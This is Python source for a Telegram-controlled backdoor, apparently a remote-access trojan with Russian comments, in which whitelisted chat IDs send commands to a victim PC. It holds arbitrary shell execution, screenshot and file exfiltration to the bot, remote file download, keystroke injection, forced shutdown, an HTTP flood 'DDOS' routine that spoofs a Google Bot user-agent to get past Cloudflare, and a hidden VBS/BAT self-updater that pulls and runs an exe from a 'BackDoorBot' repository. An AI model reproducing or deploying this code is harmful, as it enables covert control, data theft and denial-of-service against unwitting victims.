# -*- coding: utf8 -*-
import os
import platform
import subprocess
import threading
import requests
import pyautogui
import keyboard
import telebot
import json as jsn
import datetime
import argparse
import ctypes
import platform

# –ß—Ç–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∏–∑ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞
with open("config.json", 'r', encoding='utf-8') as f:
    data = jsn.load(f)

# –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∏–∑ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
white_list_id = data["white_list"]
info = data["info"]
update = data["update"]
name_pc = data["name_pc"]
bot_token = data["bot_token"]

# –°–æ–∑–¥–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ media, –µ—Å–ª–∏ –æ–Ω–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
if not os.path.isdir('media'):
    os.mkdir('media')

# –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ upd.vbs –∏ upd.bat, –µ—Å–ª–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ–±–Ω–æ–≤–∏—Ç—å —Å–∫—Ä–∏–ø—Ç
if update == 1:
    try:
        os.remove('upd.vbs')
        os.remove('upd.bat')
    except OSError:
        pass
    exit()

# –°–æ–∑–¥–∞–Ω–∏–µ —ç–∫–∑–µ–º–ø–ª—è—Ä–∞ –±–æ—Ç–∞
bot = telebot.TeleBot(bot_token)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


class Func_API:
    def __init__(self) -> None:
        for ids in id:
            try:
                if is_admin():
                    bot.send_message(ids, f'{name_pc} –∑–∞–ø—É—â–µ–Ω –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞')
                else:
                    bot.send_message(ids, f'{name_pc} –∑–∞–ø—É—â–µ–Ω –æ—Ç –∏–º–µ–Ω–∏ –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è')
            except Exception:
                pyautogui.alert("–í—ã —É–∫–∞–∑–∞–ª–∏ –Ω–µ–≤–µ—Ä–Ω—ã–π —Ç–æ–∫–µ–Ω")

    def rasbiv(text):
        # –°–æ–∑–¥–∞–Ω–∏–µ –ø–∞—Ä—Å–µ—Ä–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤
        parser = argparse.ArgumentParser()
        # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ name
        parser.add_argument("name", type=str, help="–ò–º—è —Ñ—É–Ω–∫—Ü–∏–∏")
        # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ cmnd
        parser.add_argument("cmnd", type=str, help="–ö–æ–º–∞–Ω–¥–∞ —Ñ—É–Ω–∫—Ü–∏–∏")
        # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã—Ö –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ text
        parser.add_argument("text", type=str, nargs="*", help="–¢–µ–∫—Å—Ç —Ñ—É–Ω–∫—Ü–∏–∏")

        # –ü–∞—Ä—Å–∏–Ω–≥ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –∏–∑ —Ç–µ–∫—Å—Ç–∞
        args = parser.parse_args(text.split())

        return {"name": args.name,
                "cmnd": args.cmnd,
                "text": args.text}

    def cmdo_ret(com):
        """
        –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã –∏ –≤–æ–∑–≤—Ä–∞—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞
        """
        try:
            # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã
            result = subprocess.check_output(com, shell=True)
        except Exception:
            return '–û—à–∏–±–∫–∞'

        try:
            # –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –±–∞–π—Ç–æ–≤–æ–π —Å—Ç—Ä–æ–∫–∏ –≤ —Å—Ç—Ä–æ–∫—É utf-8
            result = result.decode('utf-8')
        except Exception:
            try:
                # –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –±–∞–π—Ç–æ–≤–æ–π —Å—Ç—Ä–æ–∫–∏ –≤ —Å—Ç—Ä–æ–∫—É cp866
                result = result.decode('cp866')
            except Exception:
                return '–û—à–∏–±–∫–∞'

        return 'üñ•‚úÖ:\n' + result

    def cmdo(white_list_id, com, bot):
        """
        –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã
        """
        try:
            # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã
            result = subprocess.check_output(com, shell=True)
        except Exception:
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞')
            return

        try:
            # –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –±–∞–π—Ç–æ–≤–æ–π —Å—Ç—Ä–æ–∫–∏ –≤ —Å—Ç—Ä–æ–∫—É utf-8
            result = result.decode('utf-8')
        except Exception:
            try:
                # –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –±–∞–π—Ç–æ–≤–æ–π —Å—Ç—Ä–æ–∫–∏ –≤ —Å—Ç—Ä–æ–∫—É cp866
                result = result.decode('cp866')
            except Exception:
                bot.send_message(white_list_id, '–û—à–∏–±–∫–∞')
                return

        # –û—Ç–ø—Ä–∞–≤–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã
        bot.send_message(white_list_id, 'üñ•‚úÖ:\n' + result)

    def cmdi(white_list_id, com, bot):
        """
        –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã
        """
        try:
            # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã
            os.system(com)
            bot.send_message(white_list_id, "üñ•‚úÖ")
        except Exception:
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞')

    def exits(white_list_id, bot):
        dir = os.listdir("media/")
        for i in dir:
            os.remove("media/" + i)
        bot.send_message(white_list_id, "üñ•‚úÖ")

    def ip_address(white_list_id, bot):
        """
        –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± IP-–∞–¥—Ä–µ—Å–µ
        """
        try:
            # –ü–æ–ª—É—á–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–∞ —á–µ—Ä–µ–∑ jsonip.com
            ip = requests.get("http://jsonip.com/").json()
            # –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± IP-–∞–¥—Ä–µ—Å–µ —á–µ—Ä–µ–∑ ip-api.com
            response = requests.get(url=f'http://ip-api.com/json/{ip["ip"]}').json()

            # –°–æ–∑–¥–∞–Ω–∏–µ —Å–ª–æ–≤–∞—Ä—è —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ–± IP-–∞–¥—Ä–µ—Å–µ
            data = {
                '[IP]': response.get('query'),
                '[–ü—Ä–æ–≤–∞–π–¥–µ—Ä]': response.get('isp'),
                '[–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è]': response.get('org'),
                '[–°—Ç—Ä–∞–Ω–∞]': response.get('country'),
                '[–†–µ–≥–∏–æ–Ω]': response.get('regionName'),
                '[–ì–æ—Ä–æ–¥]': response.get('city'),
                '[ZIP]': response.get('zip'),
                '[–®–∏—Ä–æ—Ç–∞]': response.get('lat'),
                '[–î–æ–ª–≥–æ—Ç–∞]': response.get('lon'),
            }

            # –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç—Ä–æ–∫–∏ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ–± IP-–∞–¥—Ä–µ—Å–µ
            info_string = ""
            for k, v in data.items():
                info_string += f'{k} : {v}\n'

            # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç—Ä–æ–∫–∏ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ–± IP-–∞–¥—Ä–µ—Å–µ
            bot.send_message(white_list_id, info_string)
        except requests.exceptions.ConnectionError:
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è')

    def wgt(white_list_id, text_comand, bot):
        """
        –ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞ —Å —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ URL
        """
        try:
            # –ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞ —Å —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ URL —á–µ—Ä–µ–∑ –±–∏–±–ª–∏–æ—Ç–µ–∫—É requests
            file = requests.get(text_comand[0])
            # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –≤ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –º–µ—Å—Ç–æ
            with open(text_comand[1], 'wb') as f:
                f.write(file.content)
            bot.send_message(white_list_id, "üñ•‚úÖ")
        except Exception:
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞')

    def rebooting(white_list_id, timer, bot):
        """
        –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞ —á–µ—Ä–µ–∑ —É–∫–∞–∑–∞–Ω–Ω—ã–π –∏–Ω—Ç–µ—Ä–≤–∞–ª –≤—Ä–µ–º–µ–Ω–∏
        """
        try:
            # –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã –Ω–∞ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
            timer = "shutdown /r /t " + str(timer)
            os.system(timer)
            bot.send_message(white_list_id, "üñ•‚úÖ")
        except Exception:
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞')

    def shutdowning(white_list_id, timer, bot):
        """
        –í—ã–∫–ª—é—á–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞ —á–µ—Ä–µ–∑ —É–∫–∞–∑–∞–Ω–Ω—ã–π –∏–Ω—Ç–µ—Ä–≤–∞–ª –≤—Ä–µ–º–µ–Ω–∏
        """
        try:
            # –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã –Ω–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
            timer = "shutdown /s /t " + str(timer)
            os.system(timer)
            bot.send_message(white_list_id, "üñ•‚úÖ")
        except Exception:
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞')

    def picture(white_list_id, file, bot):
        """
        –û—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–∞ —Å —É–∫–∞–∑–∞–Ω–Ω—ã–º –∏–º–µ–Ω–µ–º
        """
        try:
            # –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—É—Ç–∏ –∫ —Ñ–∞–π–ª—É
            command = f"media\\{file}.png"
            # –û—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–∞
            os.startfile(command)
            bot.send_message(white_list_id, "üñ•‚úÖ")
            # –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞
            os.remove(command)
        except Exception as e:
            bot.send_message(white_list_id, f'–û—à–∏–±–∫–∞: {e}')

    def video(white_list_id, file, bot):
        """
        –û—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–∞ —Å —É–∫–∞–∑–∞–Ω–Ω—ã–º –∏–º–µ–Ω–µ–º
        """
        try:
            # –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—É—Ç–∏ –∫ —Ñ–∞–π–ª—É
            command = f"media\\{file}.mp4"
            # –û—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–∞
            os.startfile(command)
            bot.send_message(white_list_id, "–í–∏–¥–µ–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã—Ç–æ")
            # –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞
            os.remove(command)
        except Exception as e:
            bot.send_message(white_list_id, f'–û—à–∏–±–∫–∞: {e}')

    def specifications(self, white_list_id, bot):
        """
        –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏–π –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
        """
        x, y = pyautogui.size()
        banner = f"""–ò–º—è –ü–ö:   {platform.node()}\n
        –û–°: {platform.system()} {platform.release()}\n
        –†–∞–∑—Ä—è–¥–Ω–æ—Å—Ç—å: {platform.architecture()[0]}\n
        CPU: {platform.processor()}\n
        GPU: {os.popen("lspci | grep -i vga").read().split(":")[2].strip()}\n
        RAM: {os.popen('free -m').readlines()[1].split()[1] + " MB"}\n
        –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: {x}x{y}"""
        bot.send_message(white_list_id, banner)

    def rask(white_list_id, bot):
        try:
            keyboard.press_and_release("alt+shift")
            bot.send_message(white_list_id, "–†–∞—Å–∫–ª–∞–¥–∫–∞ —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω–∞")
        except Exception as e:
            bot.send_message(white_list_id, f"–û—à–∏–±–∫–∞: {e}")

    def screenshot(white_list_id, bot):
        # –§–æ—Ä–º–∏—Ä—É–µ–º –∏–º—è —Ñ–∞–π–ª–∞ —Å —Ç–µ–∫—É—â–µ–π –¥–∞—Ç–æ–π –∏ –≤—Ä–µ–º–µ–Ω–µ–º –≤ —Ñ–æ—Ä–º–∞—Ç–µ YYYY-MM-DD HH-MM-SS
        filename = f"screenshot_{datetime.datetime.now(datetime.timezone(datetime.timedelta(hours=3))).strftime('%Y-%m-%d %H:%M:%S').replace(' ', '_').replace(':', '-')}.jpg"

        # –°–æ–∑–¥–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞ –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –µ–≥–æ –≤ —É–∫–∞–∑–∞–Ω–Ω–æ–º —Ñ–∞–π–ª–µ
        pyautogui.screenshot(filename)

        # –û—Ç–∫—Ä—ã–≤–∞–µ–º —Ñ–∞–π–ª –≤ –±–∏–Ω–∞—Ä–Ω–æ–º —Ä–µ–∂–∏–º–µ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
        img = open(filename, "rb")
        bot.send_document(white_list_id, img)
        img.close()
        # –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª
        os.remove(filename)

    def keyb(white_list_id, text, bot):
        # –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º —Å—Ç—Ä–æ–∫—É –≤ —Å–ø–∏—Å–æ–∫, —Ä–∞–∑–¥–µ–ª–∏–≤ –µ–µ –ø–æ —Å–∏–º–≤–æ–ª—É "+"
        try:
            text = text.split("+")
            # –û–±—ä—è–≤–∏–º –ø—É—Å—Ç—É—é —Å—Ç—Ä–æ–∫—É –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–∞–≤–Ω—ã—Ö –∫–ª–∞–≤–∏—à, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥–µ–º –Ω–∞–∂–∏–º–∞—Ç—å
            listing = ""

            # –û–±—ä—è–≤–∏–º —Å–ø–∏—Å–æ–∫ —Å –∫–ª–∞–≤–∏—à–∞–º–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –Ω–∞–∂–∏–º–∞—Ç—å —á–µ—Ä–µ–∑ keyboard.press_and_release
            button = ["shift", "alt", "f1", "f2", "f3", "f4", "f5", "f6", "f7",
                      "f8", "f9", "f10", "f11", "f12", "tab", "ctrl", "enter", "capslock"]

            # –ü–µ—Ä–µ–±–∏—Ä–∞–µ–º —ç–ª–µ–º–µ–Ω—Ç—ã —Å–ø–∏—Å–∫–∞ text
            for i in text:
                try:
                    # –ï—Å–ª–∏ i —è–≤–ª—è–µ—Ç—Å—è —Å–æ—Å—Ç–∞–≤–Ω–æ–π –∫–ª–∞–≤–∏—à–µ–π (–Ω–∞–ø—Ä–∏–º–µ—Ä, shift, alt), —Ç–æ –¥–æ–±–∞–≤–ª—è–µ–º –µ–µ –≤ —Å—Ç—Ä–æ–∫—É listing
                    index = button.index(i)
                    listing += i + "+"
                except:
                    for kip in i:
                        listing += kip + "+"
                listing = listing[:-1].replace(' ', 'space')
                keyboard.press_and_release(listing)
                bot.send_message(white_list_id, "–£—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–æ")
        except Exception as e:
            bot.send_message(white_list_id, f'–û—à–∏–±–∫–∞: {e}')

    def print_gui(white_list_id, text, bot):
        try:
            # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ —Å —Ç–µ–∫—Å—Ç–æ–º text
            pyautogui.alert(text, "~")
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏
            bot.send_message(white_list_id, '–û–∫–Ω–æ —Å —Ç–µ–∫—Å—Ç–æ–º –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ')
        except Exception as e:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
            bot.send_message(white_list_id, f'–û—à–∏–±–∫–∞: {e}')

    def input_gui(white_list_id, text, bot):
        try:
            # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –¥–∏–∞–ª–æ–≥–æ–≤–æ–µ –æ–∫–Ω–æ —Å –∑–∞–ø—Ä–æ—Å–æ–º –≤–≤–æ–¥–∞
            answer = pyautogui.prompt(text, "~")
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–≤–µ—Ç –≤ —á–∞—Ç
            bot.send_message(white_list_id, answer)
        except Exception as e:
            # –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞: {}'.format(e))

    def closes(white_list_id, bot):
        # –ü—ã—Ç–∞–µ–º—Å—è –∑–∞–∫—Ä—ã—Ç—å —Ç–µ–∫—É—â–µ–µ –æ–∫–Ω–æ —Å –ø–æ–º–æ—â—å—é —Å–æ—á–µ—Ç–∞–Ω–∏—è –∫–ª–∞–≤–∏—à Alt+F4
        try:
            keyboard.press_and_release("alt+f4")
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–º –∑–∞–∫—Ä—ã—Ç–∏–∏ –æ–∫–Ω–∞
            bot.send_message(white_list_id, '–û–∫–Ω–æ —É—Å–ø–µ—à–Ω–æ –∑–∞–∫—Ä—ã—Ç–æ')
        except Exception as e:
            # –í —Å–ª—É—á–∞–µ –Ω–µ—É–¥–∞—á–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
            bot.send_message(white_list_id, f'–û—à–∏–±–∫–∞: {e}')

    def start_file(white_list_id, path, bot):
        """
        –û—Ç–∫—Ä—ã–≤–∞–µ—Ç —Ñ–∞–π–ª –ø–æ —É–∫–∞–∑–∞–Ω–Ω–æ–º—É –ø—É—Ç–∏.
        –í —Å–ª—É—á–∞–µ —É—Å–ø–µ—Ö–∞ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ '–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω',
        –≤ —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ '–û—à–∏–±–∫–∞: —Ñ–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω' –∏–ª–∏ '–û—à–∏–±–∫–∞: –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'
        """
        try:
            os.startfile(f"media/{path}")
            bot.send_message(white_list_id, '–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω')
        except FileNotFoundError:
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞: —Ñ–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω')
        except:
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞: –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞')

    def direct(white_list_id, paths, bot):
        try:
            if paths == ".":
                paths = os.getcwd()
            exit_str = ""
            exit_str += f"{paths}: \n\n"
            current, dirs, files = os.walk(paths).__next__()
            for i in files:
                exit_str += i + "\n"
            for i in dirs:
                try:
                    o = os.listdir(paths + "/" + i)
                    exit_str += "|" + i + "\n"
                    for l in o:
                        exit_str += "| - " + l + "\n"
                    exit_str += "\n"
                except:
                    pass
            bot.send_message(white_list_id, exit_str)
        except:
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞')

    def update_bot(bot, bot_token, name_pc):
        pth = os.getcwd()
        text_bat = f'''@echo off
    timeout 30
    del {pth}\\windows_shell.exe powershell -Command "Invoke-WebRequest 
    https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe -OutFile windows_shell.exe" start 
    windows_shell.exe -n {bot_token} -t {name_pc} -u 1 
    exit'''

        text_vbs = f'''
    set sh=CreateObject("Wscript.Shell")
    sh.Run "{pth}\\upd.bat", 0'''

        open('upd.bat', 'w').write(text_bat)
        open('upd.vbs', 'w').write(text_vbs)
        os.startfile('upd.vbs')
        bot.stop_polling()

    def ddos(bot, white_list_id, url):
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º headers Google –±–æ—Ç–∞, –¥–ª—è –æ–±—Ö–æ–¥–∞ Cloudflare
        headers = {"User-Agent": "Google Bot"}

        if 'http' in url and '.' in url:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ DDOS –∞—Ç–∞–∫–∏
            bot.send_message(white_list_id, f'DDOS –∞—Ç–∞–∫–∞ –Ω–∞ {url} —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω–∞')
        else:
            bot.send_message(white_list_id, f'–û—à–∏–±–∫–∞: –Ω–µ–≤–µ—Ä–Ω—ã–π url, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –≤–≤–µ–¥–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö')

        while True:
            try:
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º GET –∑–∞–ø—Ä–æ—Å —Å –¥–∞–Ω–Ω—ã–º–∏
                requests.get(url, headers=headers, allow_redirects=True, stream=True)
            except Exception:
                pass

    def pull_file(bot, white_list_id: int, path: str):
        path = path.replace('\\', '/')  # –ó–∞–º–µ–Ω–∞ —Å–∏–º–≤–æ–ª–∞ "\" –Ω–∞ "/"
        if os.path.exists(path):  # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏—è —Ñ–∞–π–ª–∞
            file = open(path, 'rb')
            bot.send_document(white_list_id, file)
        else:
            # –°–æ–∑–¥–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–µ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ —Ç–µ–∫—É—â–µ–º –∫–∞—Ç–∞–ª–æ–≥–µ
            path = path.split('/')
            if len(path) <= 1:
                otv = f"–û—à–∏–±–∫–∞ File not found \n|{os.getcwd()}\n|--  " + '\n|--  '.join(os.listdir(os.getcwd()))
            else:
                pr = '/'.join(path[:-1])
                otv = f"–û—à–∏–±–∫–∞ File not found \n|{pr}\n|--  " + '\n|--  '.join(os.listdir(pr))
                bot.send_message(white_list_id, otv)

    def browser(bot, white_list_id, link: str):
        """
        –û—Ç–∫—Ä—ã–≤–∞–µ—Ç —Å—Å—ã–ª–∫—É –≤ –±—Ä–∞—É–∑–µ—Ä–µ
        """
        try:
            linke = f'start {link}'
            os.system(linke)
            bot.send_message(white_list_id, '–°—Å—ã–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã—Ç–∞')
        except Exception as e:
            bot.send_message(white_list_id, f'–û—à–∏–±–∫–∞: {e}')

    def perfor(white_list_id, bot, self, text, id_chat):
        white_list_id = id_chat
        text = self.rasbiv(text)
        name_pc = text["name"]
        comnd = text["cmnd"]
        text_comand = text["text"]

        if name_pc.lower() == name_pc or name_pc.lower() == "all":
            if comnd == "wget":
                threading.Thread(target=self.wgt, args=(text_comand,)).start()

            if comnd == "ip" or comnd == "ipad":
                threading.Thread(target=self.ip_address).start()

            if comnd == "reboot":
                threading.Thread(target=self.rebooting, args=(text_comand[0],)).start()

            if comnd == "specifications" or comnd == "spec":
                threading.Thread(target=self.specifications).start()

            if comnd == "shotdown" or comnd == "shdn" or comnd == "vikl":
                threading.Thread(target=self.shutdowning, args=(text_comand[0],)).start()

            if comnd == "picture" or comnd == "pict" or comnd == "pic":
                threading.Thread(target=self.picture, args=(text_comand[0],)).start()

            if comnd == "cmdi":
                threading.Thread(target=self.cmdi, args=(text_comand[0],)).start()

            if comnd == "cmdo":
                threading.Thread(target=self.cmdo, args=(text_comand[0],)).start()

            if comnd == "video" or comnd == "vide" or comnd == "vid":
                threading.Thread(target=self.video, args=(text_comand[0],)).start()

            if comnd == "exit" or comnd == "cls" or comnd == "clear":
                threading.Thread(target=self.exits).start()

            if comnd == "lock" or comnd == "close":
                threading.Thread(target=self.closes).start()

            if comnd == "keyb" or comnd == "keyboard":
                threading.Thread(target=self.keyb, args=(text_comand[0],)).start()

            if comnd == "rask" or comnd == "layout":
                threading.Thread(target=self.rask).start()

            if comnd == "dir" or comnd == "direction":
                threading.Thread(target=self.direct, args=(text_comand[0],)).start()

            if comnd == "screenshot" or comnd == "scrn":
                threading.Thread(target=self.screenshot).start()

            if comnd == "inpt" or comnd == "input":
                threading.Thread(target=self.input_gui, args=(text_comand[0],)).start()

            if comnd == "outp" or comnd == "output":
                threading.Thread(target=self.print_gui, args=(text_comand[0],)).start()

            if comnd == "start" or comnd == "strt":
                threading.Thread(target=self.start_file, args=(text_comand[0],)).start()

            if comnd == "ddos" or comnd == "attack_while" or comnd == "sitekill":
                try:
                    for cores in text_comand[1]:
                        threading.Thread(target=self.ddos, args=(text_comand[0],)).start()
                except Exception as e:
                    bot.send_message(white_list_id, f'–û—à–∏–±–∫–∞: {e}')

            if comnd == "browser" or comnd == "brws":
                threading.Thread(target=self.browser, args=(text_comand[0],)).start()

            if comnd == "pull" or comnd == "pull_file":
                threading.Thread(target=self.pull_file, args=(text_comand[0],)).start()

            if comnd == "kill":
                self.exits()
                bot.stop_polling()

            if comnd == "upd":
                self.update_bot()


func_api = Func_API()


@bot.message_handler(commands=['info', 'start'])
def start_message(message):
    if message.chat.id in id:
        bot.send_message(message.chat.id, f"–°–ø–∏—Å–æ–∫ —Ñ—É–Ω–∫—Ü–∏–π: \n{info}")


@bot.message_handler(content_types=['text'])
def infokigb(message):
    if message.chat.id in id:
        func_api.perfor(message.text, message.chat.id)


@bot.message_handler(content_types=['photo'])
def handle_docs_document(message):
    if message.chat.id in id:
        file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = 'media/' + message.photo[1].file_id
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        picu = func_api.ren(message.photo[1].file_id, "pic")
        bot.reply_to(message, f"OK. –°–æ—Ö—Ä–∞–Ω–∏–ª –∫–∞–∫ {picu} –ø–æ –ø—É—Ç–∏ {src}")


@bot.message_handler(content_types=['video'])
def get_file(message):
    if message.chat.id in id:
        print(message.json)
